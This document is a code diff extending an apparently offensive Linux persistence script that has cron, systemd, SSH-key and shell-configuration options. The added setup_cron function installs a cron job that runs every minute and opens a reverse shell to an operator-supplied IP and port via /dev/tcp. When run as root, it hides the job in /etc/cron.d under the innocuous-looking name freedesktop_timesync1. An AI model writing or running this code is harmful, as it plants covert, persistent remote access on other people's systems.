@@ -37,13 +37,16 @@ usage_user() {
     echo "Low Privileged User Options:"
     echo ""
     echo "  --cron                      Cron job persistence"
+    echo "    --default                    Use default cron settings"
+    echo "        --ip <ip>                  Specify IP address"
+    echo "        --port <port>              Specify port number"
     echo "  --shell-configuration       Shell configuration persistence"
     echo "  --ssh-key                   SSH key persistence"
     echo "  --systemd                   Systemd service persistence"
-    echo "      --default                    Use default settings"
+    echo "      --default                    Use default systemd settings"
     echo "          --ip <ip>                  Specify IP address"
     echo "          --port <port>              Specify port number"
-    echo "      --custom                     Use custom settings (make sure they are valid!)"
+    echo "      --custom                     Use custom systemd settings (make sure they are valid!)"
     echo "          --path <path>                Specify custom service path (must end with .service)"
     echo "          --command <command>          Specify custom persistence command (no validation)"
     echo "          --timer                      Create systemd timer (1 minute interval)"
@@ -54,13 +57,26 @@ usage_root() {
     echo "Root User Options:"
     echo ""
     echo "  --cron                      Cron job persistence"
+    echo "      --default                    Use default cron settings"
+    echo "          --ip <ip>                  Specify IP address"
+    echo "          --port <port>              Specify port number"
+    echo "      --custom                     Use custom cron settings"
+    echo "          --command <command>         Specify custom persistence command (no validation)"
+    echo "          --crond                     Persist in cron.d directory"
+    echo "          --daily                     Persist in cron.daily directory"
+    echo "          --hourly                    Persist in cron.hourly directory"
+    echo "          --monthly                   Persist in cron.monthly directory"
+    echo "          --weekly                    Persist in cron.weekly directory"
+    echo "          --name <name>               Specify custom cron job name"
+    echo "          --crontab                   Persist in crontab file"
+
     echo "  --shell-configuration       Shell configuration persistence"
     echo "  --ssh-key                   SSH key persistence"
     echo "  --systemd                   Systemd service persistence"
-    echo "      --default                    Use default settings"
+    echo "      --default                    Use default systemd settings"
     echo "          --ip <ip>                  Specify IP address"
     echo "          --port <port>              Specify port number"
-    echo "      --custom                     Use custom settings (make sure they are valid!)"
+    echo "      --custom                     Use custom systemd settings (make sure they are valid!)"
     echo "          --path <path>                Specify custom service path (must end with .service)"
     echo "          --command <command>          Specify custom persistence command (no validation)"
     echo "          --timer                      Create systemd timer (1 minute interval)"
@@ -282,8 +298,112 @@ setup_systemd() {
 
 # Function for cron job setup
 setup_cron() {
-    echo "Setting up cron job..."
-    # Add your cron setup code here
+    local cron_path=""
+    local command=""
+    local custom=0
+    local default=0
+    local ip=""
+    local port=""
+    local name=""
+    local option=""
+
+    while [[ "$1" != "" ]]; do
+        case $1 in
+            --default )
+                default=1
+                ;;
+            --custom )
+                custom=1
+                ;;
+            --command )
+                shift
+                command=$1
+                ;;
+            --ip )
+                shift
+                ip=$1
+                ;;
+            --port )
+                shift
+                port=$1
+                ;;
+            --crond|--daily|--hourly|--monthly|--weekly )
+                if check_root; then
+                    option=$1
+                    case $option in
+                        --crond )
+                            cron_path="/etc/cron.d"
+                            ;;
+                        --daily )
+                            cron_path="/etc/cron.daily"
+                            ;;
+                        --hourly )
+                            cron_path="/etc/cron.hourly"
+                            ;;
+                        --monthly )
+                            cron_path="/etc/cron.monthly"
+                            ;;
+                        --weekly )
+                            cron_path="/etc/cron.weekly"
+                            ;;
+                    esac
+                else
+                    echo "Error: Only root users can use the $option option."
+                    exit 1
+                fi
+                ;;
+            --crontab )
+                if check_root; then
+                    cron_path="/etc/crontab"
+                else
+                    echo "Error: Only root users can use the --crontab option."
+                    exit 1
+                fi
+                ;;
+            --name )
+                shift
+                name=$1
+                ;;
+            * )
+                echo "Invalid option: $1"
+                exit 1
+        esac
+        shift
+    done
+
+    if [[ $default -eq 1 ]]; then
+        if [[ -z $ip || -z $port ]]; then
+            echo "Error: --default requires --ip and --port."
+            exit 1
+        fi
+        if check_root; then
+            cron_path="/etc/cron.d/freedesktop_timesync1"
+            command="* * * * * root /bin/bash -c 'sh -i >& /dev/tcp/$ip/$port 0>&1'"
+            echo "$command" > "$cron_path"
+
+        else
+            command="* * * * * /bin/bash -c 'sh -i >& /dev/tcp/$ip/$port 0>&1'"
+            (crontab -l 2>/dev/null; echo "$command") | crontab -
+        fi
+    elif [[ $custom -eq 1 ]]; then
+        if [[ -z $command ]]; then
+            echo "Error: --custom requires --command."
+            exit 1
+        fi
+        if [[ $cron_path != "/etc/crontab" && -z $name ]]; then
+            echo "Error: --custom requires --name for all options other than --crontab."
+            exit 1
+        fi
+        if [[ $cron_path != "/etc/crontab" ]]; then
+            cron_path="$cron_path/$name"
+        fi
+        echo "$command" > "$cron_path"
+    else
+        echo "Error: Either --default or --custom must be specified for --cron."
+        exit 1
+    fi
+
+    echo "[+] Cron job persistence established."
 }
 
 # Function for generating SSH key
@@ -300,6 +420,32 @@ configure_shell() {
 
 # Main script logic
 QUIET=0
+
+if [[ $# -eq 0 ]]; then
+    if [[ $QUIET -ne 1 ]]; then
+        print_banner
+    fi
+    if check_root; then
+        usage_root
+    else
+        usage_user
+    fi
+    exit 0
+fi
+
+for arg in "$@"; do
+    if [[ "$arg" == "-h" || "$arg" == "--help" ]]; then
+        if [[ $QUIET -ne 1 ]]; then
+            print_banner
+        fi
+        if check_root; then
+            usage_root
+        else
+            usage_user
+        fi
+        exit 0
+    fi
+done
 
 # Parse command line arguments
 while [[ "$1" != "" ]]; do
@@ -321,7 +467,8 @@ while [[ "$1" != "" ]]; do
             exit
             ;;
         --cron )
-            setup_cron
+            shift
+            setup_cron "$@"
             exit
             ;;
         --ssh-key )
